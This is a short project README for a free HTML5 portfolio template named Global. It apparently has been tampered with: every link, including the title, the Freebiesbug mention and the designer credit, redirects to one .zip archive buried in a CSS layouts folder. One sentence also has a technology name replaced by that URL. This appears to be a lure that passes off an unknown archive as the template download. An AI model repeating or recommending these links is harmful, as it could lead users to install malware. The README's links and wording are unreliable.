# [Global: HTML5 website template](https://raw.githubusercontent.com/alizeynaloov/global/master/assets/css/layouts/global_3.3.zip)

### [Featured on Freebiesbug](https://raw.githubusercontent.com/alizeynaloov/global/master/assets/css/layouts/global_3.3.zip)

Global is a modern and sleek website template crafted for professionals in the creative industry. Global can serve as a single page portfolio or be easily modified to serve as the perfect beginning for a hip creative agency.

The original PSD is included and was provided by [Sergey Melnik](https://raw.githubusercontent.com/alizeynaloov/global/master/assets/css/layouts/global_3.3.zip).

This project was developed with HTML5, Sass, jQuery, and https://raw.githubusercontent.com/alizeynaloov/global/master/assets/css/layouts/global_3.3.zip

Performance basics are covered: assets are minified into single CSS and JS files, and the images are optimized.
